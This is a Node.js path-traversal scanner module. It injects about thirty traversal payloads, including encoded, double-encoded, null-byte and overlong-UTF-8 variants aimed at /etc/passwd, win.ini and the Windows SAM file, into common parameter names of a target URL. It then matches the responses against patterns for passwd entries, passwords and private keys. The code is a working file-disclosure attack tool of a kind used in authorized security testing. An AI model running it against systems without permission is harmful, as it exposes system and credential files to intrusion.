/**
 * Directory Traversal Scanner
 * Detects Path Traversal / Directory Traversal vulnerabilities
 */

const axios = require('axios');

// Directory traversal payloads
const PAYLOADS = [
  // Unix paths
  '../../../../../../../../../../etc/passwd',
  '../../../../../../../../../../../etc/passwd',
  '../../../etc/passwd',
  '../../etc/passwd',
  '../etc/passwd',
  '....//....//....//....//etc/passwd',
  '..../....//....//etc/passwd',
  '/etc/passwd',
  '/../../etc/passwd',
  
  // Windows paths
  '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam',
  '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
  '..\\..\\..\\..\\windows\\system32\\config\\sam',
  '....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini',
  
  // Encoded variations
  '..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
  '..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd',
  '..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
  
  // Null byte injection
  '../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  
  // Double URL encoding
  '..%252f..%252f..%252fetc%252fpasswd',
  '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  
  // Unicode encoding
  '..\u002f..\u002f..\u002f..\u002fetc\u002fpasswd',
  '..\u005c..\u005c..\u005c..\u005cwindows\u005cwin.ini',
  
  // 16-bit unicode
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
  
  // Other variations
  '.../.../.../.../.../etc/passwd',
  '....\/....\/....\/etc/passwd',
  '/..\\../..\\../etc/passwd'
];

// Common vulnerable parameters
const VULNERABLE_PARAMS = [
  'file', 'path', 'page', 'dir', 'folder', 'document', 'template',
  'download', 'img', 'image', 'view', 'action', 'page', 'name',
  'cat', 'log', 'conf', 'config', 'source', 'read', 'load', 'include'
];

// Patterns that indicate successful file disclosure
const FILE_PATTERNS = [
  // Unix passwd file
  /root:[^:]+:[0-9]+:[0-9]+:/m,
  /daemon:[^:]+:[0-9]+:[0-9]+:/m,
  /bin:\/bin/m,
  /\/bin\/bash/m,
  /\/bin\/sh/m,
  
  // Windows
  /\[boot loader\]/i,
  /\[ Fonts \]/i,
  /\[extensions\]/i,
  /microsoft/i,
  
  // Generic sensitive files
  /<!\[CDATA\[/i,
  /password\s*=/i,
  /mysql/i,
  /postgres/i,
  /database/i,
  /connection/i,
  /private.*key/i,
  /-----BEGIN.*PRIVATE KEY-----/i
];

// Error patterns that might indicate path traversal
const ERROR_PATTERNS = [
  /No such file or directory/i,
  /Permission denied/i,
  /Access denied/i,
  /Path not found/i,
  /File not found/i,
  /directory doesn't exist/i,
  /Invalid path/i,
  /Traversal detected/i,
  /Not allowed/i,
  /Forbidden/i,
  /Parent directory not allowed/i
];

/**
 * Test a single parameter with payload
 */
async function testParameter(url, method, paramName, paramValue, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    let testUrl = url;
    let testBody = null;

    const modifiedPayload = paramValue + payload;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, modifiedPayload);
      testUrl = urlObj.toString();
    } else {
      testBody = { [paramName]: modifiedPayload };
    }

    const response = await axios({
      method,
      url: testUrl,
      data: testBody,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });

    clearTimeout(timeout);

    const responseText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    // Check for file disclosure patterns
    for (const pattern of FILE_PATTERNS) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          payload,
          fileFound: true,
          type: 'file-disclosure',
          parameter: paramName,
          location: method === 'GET' ? 'query' : 'body',
          confidence: 'high',
          evidence: responseText.substring(0, 500)
        };
      }
    }

    // Check for path traversal errors (might indicate partial vulnerability)
    for (const pattern of ERROR_PATTERNS) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          payload,
          fileFound: false,
          type: 'path-validation-detected',
          parameter: paramName,
          location: method === 'GET' ? 'query' : 'body',
          confidence: 'medium',
          evidence: responseText.substring(0, 500)
        };
      }
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    
    // Check error for path traversal indication
    const errorText = error.message || '';
    for (const pattern of ERROR_PATTERNS) {
      if (pattern.test(errorText)) {
        return {
          vulnerable: true,
          payload,
          fileFound: false,
          type: 'path-validation-error',
          parameter: paramName,
          location: method === 'GET' ? 'query' : 'body',
          confidence: 'low',
          evidence: errorText
        };
      }
    }
    
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Test for null byte injection
 */
async function testNullByte(url, method, paramName, paramValue) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    let testUrl = url;
    let testBody = null;

    // Try various null byte encodings
    const nullBytePayloads = [
      paramValue + '../../etc/passwd%00',
      paramValue + '../../etc/passwd%00.jpg',
      paramValue + '../../etc/passwd\0',
      paramValue + '../../etc/passwd\x00'
    ];

    for (const payload of nullBytePayloads) {
      if (method === 'GET') {
        const urlObj = new URL(url);
        urlObj.searchParams.set(paramName, payload);
        testUrl = urlObj.toString();
      } else {
        testBody = { [paramName]: payload };
      }

      const response = await axios({
        method,
        url: testUrl,
        data: testBody,
        timeout: 10000,
        signal: controller.signal,
        validateStatus: () => true
      });

      const responseText = typeof response.data === 'string'
        ? response.data
        : JSON.stringify(response.data);

      // Check for file patterns
      for (const pattern of FILE_PATTERNS) {
        if (pattern.test(responseText)) {
          clearTimeout(timeout);
          return {
            vulnerable: true,
            payload,
            fileFound: true,
            type: 'null-byte-injection',
            parameter: paramName,
            confidence: 'high',
            evidence: responseText.substring(0, 500)
          };
        }
      }
    }

    clearTimeout(timeout);
    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Main scan function
 */
async function scan(target) {
  const { url, params, method = 'GET' } = target;

  const results = {
    vulnerable: false,
    vulnerabilities: [],
    tested: { params: 0, payloads: 0 }
  };

  // Find parameters to test
  const paramsToTest = Object.keys(params).length > 0
    ? Object.keys(params)
    : VULNERABLE_PARAMS;

  // Test each parameter
  for (const paramName of paramsToTest) {
    const paramValue = params[paramName] || '';
    results.tested.params++;

    for (const payload of PAYLOADS) {
      results.tested.payloads++;

      const result = await testParameter(url, method, paramName, paramValue, payload);

      if (result.vulnerable) {
        results.vulnerable = true;
        results.vulnerabilities.push(result);

        // Return first high confidence finding
        if (result.confidence === 'high') {
          return {
            success: true,
            ...results
          };
        }
      }
    }
  }

  return {
    success: true,
    ...results
  };
}

module.exports = { scan };